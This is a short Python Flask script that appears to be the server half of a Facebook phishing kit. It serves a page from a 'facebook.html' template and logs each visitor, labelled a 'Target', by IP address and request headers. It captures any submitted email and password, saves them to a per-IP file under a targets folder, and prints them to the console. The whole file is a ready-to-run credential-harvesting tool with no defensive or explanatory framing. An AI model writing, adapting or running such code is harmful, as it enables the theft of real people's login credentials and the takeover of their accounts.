from flask import Flask, render_template, request
from termcolor import colored

app = Flask(__name__)

@app.route('/', methods = ['GET', 'POST'])
def index():
	ip = request.remote_addr
	headers = request.headers
	print(f"\n{colored('Target Visited to the URL', 'green')}\n\nHeaders : \n{headers}")
	if request.method == 'POST':
		email = request.form.get('email')
		password = request.form.get('password')
		with open("targets/"+ip+"_fb"+".txt", 'w') as creds:
			creds.write(f"IP => {ip}\nHost Info: \n{headers}Username => {email}\nPassword => {password}")
		print(f"Username => {colored(email, 'green')}\nPassword => {colored(password, 'green')}\n")
	return render_template('facebook.html')

app.run(host="0.0.0.0")